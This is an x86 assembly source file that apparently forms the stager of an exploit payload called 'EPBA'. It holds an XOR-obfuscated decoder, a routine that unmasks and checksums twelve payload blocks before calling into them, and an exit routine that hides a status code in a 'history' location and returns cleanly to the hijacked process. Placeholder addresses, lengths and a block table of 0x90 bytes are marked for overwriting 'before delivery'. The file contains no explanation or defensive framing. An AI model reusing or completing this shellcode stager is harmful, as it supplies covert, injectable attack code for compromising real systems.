.set block1_decoder_len, (block1_decoder_end - block1_decoder_start) ^ scramble_word
.set block_decoder_len, (block_decoder_end - block_decoder_start)
.set blocks_table_len, (blocks_table_end - blocks_table_start)
.set epba_exit_len, (epba_exit_end - epba_exit_start)

.set len_to_fix, 0xefbeadde   /* 0xdeadbeef byterev'd */
.set addr_to_fix, 0xbebaedc0  /* 0xc0edbabe byterev'd */
.set cksum_to_fix, 0xbb

.set scramble_byte, 0xaa
.set scramble_word, 0xaaaaaaaa

.section .text

/* ************************************ */

.globl block1_decoder_start
block1_decoder_start:
	push %eax                         /* create a slot for ret addr */
        pusha                             /* preserve all registers */
        mov $block1_decoder_len, %eax
        xor $scramble_word, %eax          /* size of this decoder */
	mov $addr_to_fix, %edi
        add %eax, %edi                    /* edi = data */
        mov $len_to_fix, %ecx
        xor $scramble_word, %ecx          /* ecx = counter */
block1_decoder_loop:
        movb (%edi), %bl
        xor $scramble_byte, %bl
        movb %bl, (%edi)
        inc %edi
        loop block1_decoder_loop

.globl block1_decoder_end
block1_decoder_end:

/* ************************************ */

.globl block_decoder_start
block_decoder_start:
outer_loop_init:
	mov $addr_to_fix, %edi   /* edi = start of block table */
	xor %ecx, %ecx           /* outer loop counter, 0..11 */

outer_loop:
	push %ecx                /* save outer loop counter */

inner_loop_init:
	mov (%edi), %esi           /* esi = addr of block to decode */
	add $4, %edi
	xor %ecx, %ecx
        movb (%edi), %ch           /* ecx = block len, high byte */
	inc %edi
        movb (%edi), %cl           /* ecx = block len, low byte */
	inc %edi
	movb (%edi), %dl           /* dl = block checksum (goes to zero) */
	inc %edi
	movb (%edi), %al           /* al = block mask byte */
	inc %edi

inner_loop:
        movb (%esi), %bl     /* bl = byte of data */
	xor %al, %bl         /* remove mask */
        movb %bl, (%esi)
	xor %bl, %dl         /* accum checksum */
        inc %esi
        loop inner_loop

outer_loop_next:
	pop %ecx
	inc %ecx
	cmp $12, %ecx            /* always 12 blocks */
	jne outer_loop

check_cksum:
	cmpb $0, %dl
	jne bad_cksum

call_payload:
	mov $block2addr, %ecx
	call *%ecx              /* call the payload here */
	jmp end_decode          /* reports status in eax */

bad_cksum:
	mov $2, %eax            /* status 2, payload was mangled */

end_decode:

.globl block_decoder_end
block_decoder_end:

/* ************************************ */

.globl epba_exit_start
epba_exit_start:

check_status:
	cmp $0, %eax
	jne status_not_zero
        mov $0x707261, %ebx   /* 0 = EPBA ok, payload reports fail = "arp" */
	jmp report_status

status_not_zero:
	cmp $1, %eax
	jne status_not_one
        mov $0x75746d, %ebx   /* 1 = EPBA and payload ok = "mtu" */
	jmp report_status

status_not_one:
        mov $0x74616e, %ebx   /* 2 = EPBA ok, payload mangled, not called = "nat" */

report_status:
	mov $block12addr, %ecx   /* history loc for our status msg */
        mov %ebx, (%ecx)         /* put status msg above at history loc */

epba_exit_clean:
	popa
	ret

.globl epba_exit_end
epba_exit_end:

/* ************************************ */

/* info about payload blocks 2..13 (12 blocks) */
/* placeholder block, overwrite with real values before delivery */
.globl blocks_table_start
blocks_table_start:
	/* addr(4), len(2), cksum(1), mask(1) */
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90  /* block 2 */
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90
	.byte 0x90,0x90,0x90,0x90, 0x90,0x90, 0x90, 0x90  /* block 13 */
.globl blocks_table_end
blocks_table_end:
